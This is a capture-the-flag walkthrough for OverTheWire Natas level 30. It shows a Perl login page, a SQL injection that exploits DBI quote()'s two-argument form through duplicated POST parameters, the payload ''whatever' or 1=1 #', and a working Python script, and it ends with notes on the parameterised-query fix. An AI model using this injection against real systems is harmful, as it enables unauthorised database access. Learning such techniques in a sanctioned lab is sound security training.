> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas30.natas.labs.overthewire.org`                  |
| Username | `natas30`                                                    |
| Password | *found in [Natas Level 28 → 29](natas-level-28-level-29.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own Perl source
- **Python** — to craft the multi-value POST request that exploits `quote()`

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas30.natas.labs.overthewire.org` and log in with the password from Level 29.

The page is a login form with **username** and **password** fields. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```perl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect(
        "DBI:mysql:natas30", "natas30", "<censored>",
        {'RaiseError' => 1}
    );

    my $query = "Select * FROM users where username ="
              . $dbh->quote(param('username'))
              . " and password ="
              . $dbh->quote(param('password'));

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    } else {
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
```

The query is built by string-concatenating `$dbh->quote()` around each parameter. `quote()` wraps values in single quotes and escapes internal ones, submitting `' OR 1=1` produces `'\' OR 1=1'`, which the SQL parser treats as a literal string. That escaping holds as long as `quote()` is called with one argument. The vulnerability is in what happens when it receives two.

---

### Understand `quote()`'s Two Signatures

```perl
$dbh->quote($value);               # one-argument: wraps in quotes, escapes
$dbh->quote($value, $data_type);   # two-argument: for numeric types, returns $value raw
```

The `$data_type` is a SQL type code (`SQL_CHAR = 1`, `SQL_NUMERIC = 2`, `SQL_INTEGER = 4`, …). For numeric types, DBI returns `$value` unquoted and unescaped, a numeric literal in SQL needs no quotes. The developer intended the one-argument form. Whether they get it depends on how many values `param()` returns.

---

### Understand `param()` With Multiple Values

`CGI::param('name')` returns a list of all values submitted for that parameter. Submitting `password=foo&password=bar` makes `param('password')` return `('foo', 'bar')`. Perl flattens that list into the surrounding call:

```perl
$dbh->quote(param('password'))
# becomes, with two submitted values:
$dbh->quote('foo', 'bar')
```

That is the two-argument form. `'foo'` is `$value`; `'bar'` is `$data_type`. If the second value is any numeric type code, DBI returns the first value verbatim, no quoting, no escaping, and the injection lands in the query.

---

### Step 3 — Construct the Payload

Submit `password` twice: first value is the injection string, second is a numeric type code.

```
password = 'whatever' or 1=1 #
password = 4
```

`$dbh->quote("'whatever' or 1=1 #", 4)` returns the string raw. The assembled query:

```sql
Select * FROM users where username ='natas30' and password ='whatever' or 1=1 #
```

`or 1=1` is always true. `#` is MySQL's line comment, anything after it is discarded. The query returns a row, `$sth->fetch()` is truthy, and the password is printed.

---

### Step 4 — Python Script

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas30", "<password>")
url  = "http://natas30.natas.labs.overthewire.org/index.pl"

response = requests.post(url, auth=auth, data={
    "username": "natas30",
    "password": ["'whatever' or 1=1 #", 4]
})
print(response.text)
```

Passing a list as a `data` value makes `requests` submit that key twice in the POST body. The server receives two `password` parameters, `param('password')` returns both, and `quote()` is called with two arguments.

```bash
python3 natas30.py
```

Output:

```
win!<br>here is your result:<br>natas31<password>
```

`print @$ver` prints the fetched row as a flat array with no separator — username and password concatenated directly. The natas31 password is everything after `natas31`.

That is the password for [Natas Level 30 → 31](natas-level-30-level-31.md).

---

## Key Takeaways

- **`quote()` is not uniformly safe.** The one-argument form always escapes. The two-argument form returns values raw for numeric type codes. The developer intended one path; the language's argument-flattening silently activated the other.
- **`CGI::param()` returns all submitted values for a key, not just the first.** Any code that calls `param()` inside a function call assumes one value was submitted. That assumption is not enforced and can be broken by any HTTP client.
- **Parameterised queries are the correct fix.** `$sth = $dbh->prepare("... WHERE password = ?"); $sth->execute($password)` separates query structure from data at the protocol level — no amount of duplicate parameters or type hints can inject SQL through a placeholder.
- **This is the third consecutive Perl-specific idiom.** Level 29 exploited two-argument `open()`. Level 30 exploits `param()` list-flattening into `quote()`. The root cause is the same: Perl's implicit list handling makes "one argument" and "two arguments" indistinguishable at the call site when the argument is a function that can return multiple values.

---